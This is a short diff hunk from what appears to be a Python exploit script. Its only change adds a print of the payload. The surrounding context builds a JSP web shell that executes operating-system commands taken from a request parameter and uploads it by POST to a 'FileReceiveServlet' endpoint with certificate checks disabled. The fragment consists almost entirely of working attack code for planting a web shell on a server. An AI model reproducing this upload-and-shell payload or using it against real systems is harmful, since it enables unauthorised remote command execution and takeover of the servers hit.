@@ -61,6 +61,7 @@ def exp1(u):
                 'java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int ' \
                 'a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new ' \
                 'String(b)); } out.print("</pre>"); } %> '
+    print(shellFlag)
     uploadData += shellFlag
     try:
         req1 = requests.post(u + "/servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData,
